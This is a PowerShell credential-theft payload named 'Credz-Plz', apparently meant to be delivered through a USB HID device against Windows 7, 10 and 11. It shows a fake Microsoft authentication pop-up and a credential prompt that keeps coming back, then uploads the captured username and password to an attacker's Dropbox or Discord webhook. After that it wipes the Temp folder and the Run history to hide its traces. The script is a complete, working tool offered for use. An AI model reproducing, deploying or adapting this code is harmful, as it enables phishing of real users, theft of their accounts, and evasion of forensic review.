############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : Credz-Plz         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
# Category     : Credentials       | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
# Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
############################################################################################################################################################

<#
.SYNOPSIS
	This script is meant to trick your target into sharing their credentials through a fake authentication pop up message

.DESCRIPTION 
	A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account"
	This will be followed by a fake authentication ui prompt. 
	If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up 
	Once the target enters their credentials their information will be uploaded to either your Dropbox or Discord webhook for collection

.Link
	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads

#>

#------------------------------------------------------------------------------------------------------------------------------------
# Configuration Variables (Replace these with your own tokens for Dropbox and Discord)
$db = "YOUR-DROPBOX-ACCESS-TOKEN"
$dc = "YOUR-DISCORD-WEBHOOK"
#------------------------------------------------------------------------------------------------------------------------------------

# Generate File Name
$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"

#------------------------------------------------------------------------------------------------------------------------------------

function Get-Creds {
    while ($true) {
        # Display the credential prompt
        $cred = $host.ui.promptforcredential(
            'Failed Authentication',
            '',
            [Environment]::UserDomainName + '\' + [Environment]::UserName,
            [Environment]::UserDomainName
        )

        # Check if the user canceled the prompt (returns null when canceled)
        if ($cred -eq $null) {
            Add-Type -AssemblyName PresentationCore,PresentationFramework
            $msgBody = "No credentials were provided. Please try again."
            $msgTitle = "Error"
            $msgButton = 'Ok'
            $msgImage = 'Stop'
            [System.Windows.MessageBox]::Show($msgBody, $msgTitle, $msgButton, $msgImage)
            continue
        }

        # Get the password from the credential object
        $password = $cred.GetNetworkCredential().Password

        # If the password is empty, show the error message
        if ([string]::IsNullOrWhiteSpace($password)) {
            Add-Type -AssemblyName PresentationCore,PresentationFramework
            $msgBody = "Credentials cannot be empty! Please enter a valid password."
            $msgTitle = "Error"
            $msgButton = 'Ok'
            $msgImage = 'Stop'
            [System.Windows.MessageBox]::Show($msgBody, $msgTitle, $msgButton, $msgImage)
        } else {
            return $cred.GetNetworkCredential() # Return the valid credentials
        }
    }
}




#------------------------------------------------------------------------------------------------------------------------------------

function Pause-Script {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell

    while ($true) {
        $pauseTime = 3
        if ([System.Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
            break
        } else {
            $o.SendKeys("{CAPSLOCK}")
            Start-Sleep -Seconds $pauseTime
        }
    }
}

#------------------------------------------------------------------------------------------------------------------------------------

function Caps-Off {
    Add-Type -AssemblyName System.Windows.Forms
    $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

    if ($caps -eq $true) {
        $key = New-Object -ComObject WScript.Shell
        $key.SendKeys('{CapsLock}')
    }
}

#------------------------------------------------------------------------------------------------------------------------------------

function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    )
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = @{
        "Authorization"      = $authorization
        "Dropbox-API-Arg"    = $arg
        "Content-Type"       = 'application/octet-stream'
    }
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

#------------------------------------------------------------------------------------------------------------------------------------

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position = 0, Mandatory = $False)]
        [string]$file,
        [parameter(Position = 1, Mandatory = $False)]
        [string]$text
    )

    $hookurl = "$dc"
    $Body = @{
        'username' = $env:username
        'content'  = $text
    }

    if (-not ([string]::IsNullOrWhiteSpace($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrWhiteSpace($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

#------------------------------------------------------------------------------------------------------------------------------------

# Main Script Logic

Pause-Script
Caps-Off

Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Please authenticate your Microsoft Account."
$msgTitle = "Authentication Required"
$msgButton = 'Ok'
$msgImage = 'Warning'
[System.Windows.MessageBox]::Show($msgBody, $msgTitle, $msgButton, $msgImage)

$creds = Get-Creds
echo $creds >> $env:TMP\$FileName

if (-not ([string]::IsNullOrEmpty($db))) {
    DropBox-Upload -f $env:TMP\$FileName
}

if (-not ([string]::IsNullOrEmpty($dc))) {
    Upload-Discord -file $env:TMP\$FileName
}

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
